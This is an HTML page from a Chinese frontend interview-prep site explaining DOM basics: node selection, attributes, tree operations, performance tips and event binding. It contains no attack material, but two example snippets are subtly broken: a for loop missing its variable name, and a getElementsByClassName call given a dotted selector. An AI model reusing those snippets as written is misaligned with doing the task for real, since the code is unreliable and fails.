<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <title>DOM和BOM面试题 | 前端食堂</title>
    <meta name="description" content="">
    <meta name="generator" content="VuePress 1.9.8">
    <link rel="icon" href="/assets/logo.png">
    <meta name="description" content="A lightweight creator for VuePress project.">
    <link rel="preload" href="/assets/css/0.styles.a0bdfdfc.css" as="style"><link rel="preload" href="/assets/js/app.18cfc572.js" as="script"><link rel="preload" href="/assets/js/3.a5cb75aa.js" as="script"><link rel="preload" href="/assets/js/6.bc437b1e.js" as="script"><link rel="prefetch" href="/assets/js/10.48422cdc.js"><link rel="prefetch" href="/assets/js/11.a8e08e99.js"><link rel="prefetch" href="/assets/js/12.93534653.js"><link rel="prefetch" href="/assets/js/13.cdd6e4c7.js"><link rel="prefetch" href="/assets/js/14.bb7f88cf.js"><link rel="prefetch" href="/assets/js/15.dc0a8b14.js"><link rel="prefetch" href="/assets/js/16.54c24170.js"><link rel="prefetch" href="/assets/js/17.7fc350af.js"><link rel="prefetch" href="/assets/js/18.10bb2453.js"><link rel="prefetch" href="/assets/js/19.91ea26de.js"><link rel="prefetch" href="/assets/js/20.d758385d.js"><link rel="prefetch" href="/assets/js/21.69860b07.js"><link rel="prefetch" href="/assets/js/22.91c3ab45.js"><link rel="prefetch" href="/assets/js/23.8a4bdd9f.js"><link rel="prefetch" href="/assets/js/24.6d324242.js"><link rel="prefetch" href="/assets/js/25.6c487007.js"><link rel="prefetch" href="/assets/js/26.7d894af5.js"><link rel="prefetch" href="/assets/js/27.2438dc01.js"><link rel="prefetch" href="/assets/js/28.aa20fe99.js"><link rel="prefetch" href="/assets/js/29.9997d625.js"><link rel="prefetch" href="/assets/js/30.6d5c7421.js"><link rel="prefetch" href="/assets/js/31.9cbf3b45.js"><link rel="prefetch" href="/assets/js/32.3b279873.js"><link rel="prefetch" href="/assets/js/33.cf2b5de9.js"><link rel="prefetch" href="/assets/js/34.8503f271.js"><link rel="prefetch" href="/assets/js/35.3c8e7d29.js"><link rel="prefetch" href="/assets/js/36.437d0f2d.js"><link rel="prefetch" href="/assets/js/37.005c9168.js"><link rel="prefetch" href="/assets/js/38.4a406f5f.js"><link rel="prefetch" href="/assets/js/39.3825bb06.js"><link rel="prefetch" href="/assets/js/4.4d3ae024.js"><link rel="prefetch" href="/assets/js/40.f40399ca.js"><link rel="prefetch" href="/assets/js/41.5fc019a5.js"><link rel="prefetch" href="/assets/js/42.72af5fae.js"><link rel="prefetch" href="/assets/js/43.6c81947b.js"><link rel="prefetch" href="/assets/js/44.a15f0ec9.js"><link rel="prefetch" href="/assets/js/45.46cc1031.js"><link rel="prefetch" href="/assets/js/46.9c066483.js"><link rel="prefetch" href="/assets/js/47.0c62f90c.js"><link rel="prefetch" href="/assets/js/48.e262bdae.js"><link rel="prefetch" href="/assets/js/49.bec8f75b.js"><link rel="prefetch" href="/assets/js/5.afac0b68.js"><link rel="prefetch" href="/assets/js/50.3c1d03a3.js"><link rel="prefetch" href="/assets/js/51.4cb0e0da.js"><link rel="prefetch" href="/assets/js/52.e92eaca1.js"><link rel="prefetch" href="/assets/js/53.05babc86.js"><link rel="prefetch" href="/assets/js/54.8b49c8dd.js"><link rel="prefetch" href="/assets/js/55.983fed39.js"><link rel="prefetch" href="/assets/js/56.87e660f9.js"><link rel="prefetch" href="/assets/js/57.dadae08a.js"><link rel="prefetch" href="/assets/js/58.c6a8356d.js"><link rel="prefetch" href="/assets/js/59.4ad9e30c.js"><link rel="prefetch" href="/assets/js/60.c86d364f.js"><link rel="prefetch" href="/assets/js/61.5a581a2d.js"><link rel="prefetch" href="/assets/js/62.56b0bca0.js"><link rel="prefetch" href="/assets/js/63.fe58d2ce.js"><link rel="prefetch" href="/assets/js/64.19c07325.js"><link rel="prefetch" href="/assets/js/65.2dd5f911.js"><link rel="prefetch" href="/assets/js/66.82a6e045.js"><link rel="prefetch" href="/assets/js/67.f5610f48.js"><link rel="prefetch" href="/assets/js/68.d9f1c646.js"><link rel="prefetch" href="/assets/js/69.22a44fd9.js"><link rel="prefetch" href="/assets/js/7.0927ac8c.js"><link rel="prefetch" href="/assets/js/70.bc88a09e.js"><link rel="prefetch" href="/assets/js/71.064eea43.js"><link rel="prefetch" href="/assets/js/72.280a3d03.js"><link rel="prefetch" href="/assets/js/73.01b30be4.js"><link rel="prefetch" href="/assets/js/74.08e19a9b.js"><link rel="prefetch" href="/assets/js/75.d61f7a90.js"><link rel="prefetch" href="/assets/js/76.4e8aa27a.js"><link rel="prefetch" href="/assets/js/77.e94e604e.js"><link rel="prefetch" href="/assets/js/8.daec2881.js"><link rel="prefetch" href="/assets/js/9.b912adcc.js"><link rel="prefetch" href="/assets/js/vendors~docsearch.0d6d3bd4.js">
    <link rel="stylesheet" href="/assets/css/0.styles.a0bdfdfc.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="ant-row"><div class="sidebar-button"><i aria-label="icon: bars" class="anticon anticon-bars"><svg viewBox="0 0 1024 1024" focusable="false" data-icon="bars" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M912 192H328c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h584c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zm0 284H328c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h584c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zm0 284H328c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h584c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zM104 228a56 56 0 1 0 112 0 56 56 0 1 0-112 0zm0 284a56 56 0 1 0 112 0 56 56 0 1 0-112 0zm0 284a56 56 0 1 0 112 0 56 56 0 1 0-112 0z"></path></svg></i> <span></span></div> <div class="ant-col ant-col-xs-24 ant-col-sm-24 ant-col-md-6 ant-col-lg-5 ant-col-xl-5 ant-col-xxl-4"><a href="/" class="router-link-active no-logo home-link"><!----> <span class="site-name">前端食堂</span></a> <div class="search-box mobile-search"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div></div> <div class="ant-col ant-col-xs-0 ant-col-sm-0 ant-col-md-18 ant-col-lg-19 ant-col-xl-19 ant-col-xxl-20"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><a class="ant-dropdown-link ant-dropdown-trigger">
      Hover me <i aria-label="icon: down" class="anticon anticon-down"><svg viewBox="64 64 896 896" focusable="false" data-icon="down" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M884 256h-75c-5.1 0-9.9 2.5-12.9 6.6L512 654.2 227.9 262.6c-3-4.1-7.8-6.6-12.9-6.6h-75c-6.5 0-10.3 7.4-6.5 12.7l352.6 486.1c12.8 17.6 39 17.6 51.7 0l352.6-486.1c3.9-5.3.1-12.7-6.4-12.7z"></path></svg></i></a> <a href="https://github.com/wjhuan/frontend-learn-route" target="_blank" rel="noopener noreferrer" class="repo-link"><i aria-label="icon: github" class="anticon anticon-github"><svg viewBox="64 64 896 896" focusable="false" data-icon="github" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M511.6 76.3C264.3 76.2 64 276.4 64 523.5 64 718.9 189.3 885 363.8 946c23.5 5.9 19.9-10.8 19.9-22.2v-77.5c-135.7 15.9-141.2-73.9-150.3-88.9C215 726 171.5 718 184.5 703c30.9-15.9 62.4 4 98.9 57.9 26.4 39.1 77.9 32.5 104 26 5.7-23.5 17.9-44.5 34.7-60.8-140.6-25.2-199.2-111-199.2-213 0-49.5 16.3-95 48.3-131.7-20.4-60.5 1.9-112.3 4.9-120 58.1-5.2 118.5 41.6 123.2 45.3 33-8.9 70.7-13.6 112.9-13.6 42.4 0 80.2 4.9 113.5 13.9 11.3-8.6 67.3-48.8 121.3-43.9 2.9 7.7 24.7 58.3 5.5 118 32.4 36.8 48.9 82.7 48.9 132.3 0 102.2-59 188.1-200 212.9a127.5 127.5 0 0 1 38.1 91v112.5c.8 9 0 17.9 15 17.9 177.1-59.7 304.6-227 304.6-424.1 0-247.2-200.4-447.3-447.5-447.3z"></path></svg></i></a></nav></div></div> <!----></header> <aside class="sidebar"><!----> <ul class="sidebar-links"><li><a href="/interview/" aria-current="page" title="README.md" class="sidebar-link">README.md</a></li><li><a href="/interview/article-1.html" title="CSS面试题" class="sidebar-link">CSS面试题</a></li><li><a href="/interview/article-2.html" aria-current="page" title="DOM和BOM面试题" class="active sidebar-link">DOM和BOM面试题</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/interview/article-2.html#dom-的本质" title="DOM 的本质" class="sidebar-link">DOM 的本质</a></li><li class="sidebar-sub-header"><a href="/interview/article-2.html#获取-dom-节点" title="获取 DOM 节点" class="sidebar-link">获取 DOM 节点</a></li><li class="sidebar-sub-header"><a href="/interview/article-2.html#prototype" title="prototype" class="sidebar-link">prototype</a></li><li class="sidebar-sub-header"><a href="/interview/article-2.html#attribute" title="Attribute" class="sidebar-link">Attribute</a></li><li class="sidebar-sub-header"><a href="/interview/article-2.html#dom-树操作" title="DOM 树操作" class="sidebar-link">DOM 树操作</a></li><li class="sidebar-sub-header"><a href="/interview/article-2.html#dom-性能" title="DOM 性能" class="sidebar-link">DOM 性能</a></li><li class="sidebar-sub-header"><a href="/interview/article-2.html#事件绑定" title="事件绑定" class="sidebar-link">事件绑定</a></li><li class="sidebar-sub-header"><a href="/interview/article-2.html#事件冒泡" title="事件冒泡" class="sidebar-link">事件冒泡</a></li><li class="sidebar-sub-header"><a href="/interview/article-2.html#代理" title="代理" class="sidebar-link">代理</a></li><li class="sidebar-sub-header"><a href="/interview/article-2.html#ajax-fetch-axios-的区别" title="ajax fetch axios 的区别" class="sidebar-link">ajax fetch axios 的区别</a></li><li class="sidebar-sub-header"><a href="/interview/article-2.html#htmlcollection-和-nodelist-的区别" title="HTMLCollection 和 NodeList 的区别" class="sidebar-link">HTMLCollection 和 NodeList 的区别</a></li><li class="sidebar-sub-header"><a href="/interview/article-2.html#options-请求" title="options 请求" class="sidebar-link">options 请求</a></li><li class="sidebar-sub-header"><a href="/interview/article-2.html#移动端-click-300ms-延迟" title="移动端 click 300ms 延迟" class="sidebar-link">移动端 click 300ms 延迟</a></li><li class="sidebar-sub-header"><a href="/interview/article-2.html#cookie-和-token-区别" title="cookie 和 token 区别" class="sidebar-link">cookie 和 token 区别</a></li><li class="sidebar-sub-header"><a href="/interview/article-2.html#连环问-session-和-jwt-比较-你更推荐哪个" title="连环问：session 和 JWT 比较，你更推荐哪个？" class="sidebar-link">连环问：session 和 JWT 比较，你更推荐哪个？</a></li><li class="sidebar-sub-header"><a href="/interview/article-2.html#连环问-单点登录" title="连环问：单点登录" class="sidebar-link">连环问：单点登录</a></li><li class="sidebar-sub-header"><a href="/interview/article-2.html#defer-和-async-属性有何区别" title="defer 和 async 属性有何区别" class="sidebar-link">defer 和 async 属性有何区别</a></li><li class="sidebar-sub-header"><a href="/interview/article-2.html#连环问-preload-prefetch-的区别" title="连环问：preload prefetch 的区别" class="sidebar-link">连环问：preload prefetch 的区别</a></li><li class="sidebar-sub-header"><a href="/interview/article-2.html#连环问-dns-prefetch-和-preconnect-有什么作用" title="连环问：dns-prefetch 和 preconnect 有什么作用？" class="sidebar-link">连环问：dns-prefetch 和 preconnect 有什么作用？</a></li><li class="sidebar-sub-header"><a href="/interview/article-2.html#你所了解的前端攻击手段有哪些-该如何预防" title="你所了解的前端攻击手段有哪些，该如何预防？" class="sidebar-link">你所了解的前端攻击手段有哪些，该如何预防？</a></li><li class="sidebar-sub-header"><a href="/interview/article-2.html#从输入-url-到显示页面的完整过程" title="从输入 url 到显示页面的完整过程" class="sidebar-link">从输入 url 到显示页面的完整过程</a></li><li class="sidebar-sub-header"><a href="/interview/article-2.html#连环问-什么是重绘-repaint-和重排-reflow-有何区别" title="连环问：什么是重绘 repaint 和重排 reflow ，有何区别" class="sidebar-link">连环问：什么是重绘 repaint 和重排 reflow ，有何区别</a></li><li class="sidebar-sub-header"><a href="/interview/article-2.html#连环问-触发-css-bfc-的条件" title="连环问：触发 css BFC 的条件" class="sidebar-link">连环问：触发 css BFC 的条件</a></li><li class="sidebar-sub-header"><a href="/interview/article-2.html#网络多标签之间如何通讯" title="网络多标签之间如何通讯？" class="sidebar-link">网络多标签之间如何通讯？</a></li><li class="sidebar-sub-header"><a href="/interview/article-2.html#连环问-iframe-通讯" title="连环问：iframe 通讯" class="sidebar-link">连环问：iframe 通讯</a></li><li class="sidebar-sub-header"><a href="/interview/article-2.html#说一下什么是-web-components" title="说一下什么是 web components？" class="sidebar-link">说一下什么是 web components？</a></li></ul></li><li><a href="/interview/article-3.html" title="webpack和babel面试题" class="sidebar-link">webpack和babel面试题</a></li><li><a href="/interview/article-4.html" title="js面试题" class="sidebar-link">js面试题</a></li><li><a href="/interview/article-5.html" title="网络面试题" class="sidebar-link">网络面试题</a></li><li><a href="/interview/article-6.html" title="VUE2 VUE3面试题" class="sidebar-link">VUE2 VUE3面试题</a></li><li><a href="/interview/article-7.html" title="nodejs 面试题" class="sidebar-link">nodejs 面试题</a></li><li><a href="/interview/article-8.html" title="实战经验" class="sidebar-link">实战经验</a></li><li><a href="/interview/article-9.html" title="typescript面试题" class="sidebar-link">typescript面试题</a></li><li><a href="/interview/article-10.html" title="算法面试题" class="sidebar-link">算法面试题</a></li><li><a href="/interview/article-11.html" title="微信小程序面试题" class="sidebar-link">微信小程序面试题</a></li><li><a href="/interview/article-12.html" title="3D图形学面试题" class="sidebar-link">3D图形学面试题</a></li></ul></aside> <main class="page"> <div class="theme-antdocs-content content__default"><h1 id="dom-和-bom-面试题"><a href="#dom-和-bom-面试题" class="header-anchor">#</a> DOM 和 BOM 面试题</h1> <h2 id="dom-的本质"><a href="#dom-的本质" class="header-anchor">#</a> DOM 的本质</h2> <p>讲 DOM 先从 html 讲起，讲 html 先从 XML 讲起。XML 是一种可扩展的标记语言，所谓可扩展就是它可以描述任何结构化的数据，它是一棵树！</p> <div class="language-xml extra-class"><pre class="language-xml"><code><span class="token prolog">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">&gt;</span></span>Tove<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">&gt;</span></span>Jani<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>heading</span><span class="token punctuation">&gt;</span></span>Reminder<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>heading</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>Don't forget me this weekend!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>other</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>b</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>b</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>other</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p>HTML 是一个有既定标签标准的 XML 格式，标签的名字、层级关系和属性，都被标准化（否则浏览器无法解析）。同样，它也是一棵树。</p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>UTF-8<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Document<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>this is p<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p>我们开发完的 html 代码会保存到一个文档中（一般以<code>.html</code>或者<code>.htm</code>结尾），文档放在服务器上，浏览器请求服务器，这个文档被返回。因此，最终浏览器拿到的是一个文档而已，文档的内容就是 html 格式的代码。</p> <p>但是浏览器要把这个文档中的 html 按照标准渲染成一个页面，此时浏览器就需要将这堆代码处理成自己能理解的东西，也得处理成 JS 能理解的东西，因为还得允许 JS 修改页面内容呢。</p> <p>基于以上需求，浏览器就需要把 html 转变成 DOM，html 是一棵树，DOM 也是一棵树。对 DOM 的理解，可以暂时先抛开浏览器的内部因此，先从 JS 着手，即可以认为 DOM 就是 JS 能识别的 html 结构，一个普通的 JS 对象或者数组。</p> <p>【附带一个 chrome Element 的截图】</p> <h2 id="获取-dom-节点"><a href="#获取-dom-节点" class="header-anchor">#</a> 获取 DOM 节点</h2> <div class="language-javascript extra-class"><pre class="language-javascript"><code><span class="token keyword">const</span> div1 <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'div1'</span><span class="token punctuation">)</span> <span class="token comment">// 元素</span>
<span class="token keyword">const</span> divList <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">'div'</span><span class="token punctuation">)</span> <span class="token comment">// 集合</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>divList<span class="token punctuation">.</span>length<span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>divList<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">const</span> containerList <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByClassName</span><span class="token punctuation">(</span><span class="token string">'.container'</span><span class="token punctuation">)</span> <span class="token comment">// 集合</span>
<span class="token keyword">const</span> pList <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelectorAll</span><span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">)</span> <span class="token comment">// 集合</span>
</code></pre></div><h2 id="prototype"><a href="#prototype" class="header-anchor">#</a> prototype</h2> <p>DOM 节点就是一个 JS 对象，它符合之前讲述的对象的特征 ———— 可扩展属性</p> <div class="language-javascript extra-class"><pre class="language-javascript"><code><span class="token keyword">const</span> pList <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelectorAll</span><span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> p <span class="token operator">=</span> pList<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>style<span class="token punctuation">.</span>width<span class="token punctuation">)</span> <span class="token comment">// 获取样式</span>
p<span class="token punctuation">.</span>style<span class="token punctuation">.</span>width <span class="token operator">=</span> <span class="token string">'100px'</span> <span class="token comment">// 修改样式</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>className<span class="token punctuation">)</span> <span class="token comment">// 获取 class</span>
p<span class="token punctuation">.</span>className <span class="token operator">=</span> <span class="token string">'p1'</span> <span class="token comment">// 修改 class</span>

<span class="token comment">// 获取 nodeName 和 nodeType</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>nodeName<span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>nodeType<span class="token punctuation">)</span>
</code></pre></div><h2 id="attribute"><a href="#attribute" class="header-anchor">#</a> Attribute</h2> <p>property 的获取和修改，是直接改变 JS 对象，而 Attibute 是直接改变 html 的属性。两种有很大的区别</p> <div class="language-javascript extra-class"><pre class="language-javascript"><code><span class="token keyword">const</span> pList <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelectorAll</span><span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> p <span class="token operator">=</span> pList<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
p<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">'data-name'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">'data-name'</span><span class="token punctuation">,</span> <span class="token string">'imooc'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">'style'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">'style'</span><span class="token punctuation">,</span> <span class="token string">'font-size:30px;'</span><span class="token punctuation">)</span>
</code></pre></div><h2 id="dom-树操作"><a href="#dom-树操作" class="header-anchor">#</a> DOM 树操作</h2> <p>新增节点</p> <div class="language-javascript extra-class"><pre class="language-javascript"><code><span class="token keyword">const</span> div1 <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'div1'</span><span class="token punctuation">)</span>
<span class="token comment">// 添加新节点</span>
<span class="token keyword">const</span> p1 <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">)</span>
p1<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">'this is p1'</span>
div1<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span> <span class="token comment">// 添加新创建的元素</span>
<span class="token comment">// 移动已有节点。注意是移动！！！</span>
<span class="token keyword">const</span> p2 <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'p2'</span><span class="token punctuation">)</span>
div1<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span>
</code></pre></div><p>获取父元素</p> <div class="language-javascript extra-class"><pre class="language-javascript"><code><span class="token keyword">const</span> div1 <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'div1'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> parent <span class="token operator">=</span> div1<span class="token punctuation">.</span>parentNode
</code></pre></div><p>获取子元素</p> <div class="language-javascript extra-class"><pre class="language-javascript"><code><span class="token keyword">const</span> div1 <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'div1'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> child <span class="token operator">=</span> div1<span class="token punctuation">.</span>childNodes
</code></pre></div><p>删除节点</p> <div class="language-javascript extra-class"><pre class="language-javascript"><code><span class="token keyword">const</span> div1 <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'div1'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> child <span class="token operator">=</span> div1<span class="token punctuation">.</span>childNodes
div1<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>child<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
</code></pre></div><p>还有其他操作的 API，例如获取前一个节点、获取后一个节点等，但是面试过程中经常考到的就是上面几个。</p> <h2 id="dom-性能"><a href="#dom-性能" class="header-anchor">#</a> DOM 性能</h2> <p>DOM 操作是昂贵的 —— 非常耗费性能。因此针对频繁的 DOM 操作一定要做一些处理。</p> <p>例如缓存 DOM 查询结果</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 不缓存 DOM 查询结果</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// 每次循环，都会计算 length ，频繁进行 DOM 查询</span>
<span class="token punctuation">}</span>

<span class="token comment">// 缓存 DOM 查询结果</span>
<span class="token keyword">const</span> pList <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> length <span class="token operator">=</span> pList<span class="token punctuation">.</span>length
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// 缓存 length ，只进行一次 DOM 查询</span>
<span class="token punctuation">}</span>
</code></pre></div><p>再例如，插入多个标签时，先插入 Fragment 然后再统一插入 DOM</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">const</span> listNode <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'list'</span><span class="token punctuation">)</span>

<span class="token comment">// 创建一个文档片段，此时还没有插入到 DOM 树中</span>
<span class="token keyword">const</span> frag <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createDocumentFragment</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment">// 执行插入</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> x <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> x <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> x<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> li <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'li'</span><span class="token punctuation">)</span>
  li<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">'List item '</span> <span class="token operator">+</span> x
  frag<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>li<span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token comment">// 都完成之后，再插入到 DOM 树中</span>
listNode<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>frag<span class="token punctuation">)</span>
</code></pre></div><h2 id="事件绑定"><a href="#事件绑定" class="header-anchor">#</a> 事件绑定</h2> <div class="language-javascript extra-class"><pre class="language-javascript"><code><span class="token keyword">const</span> btn <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'btn1'</span><span class="token punctuation">)</span>
btn<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'clicked'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
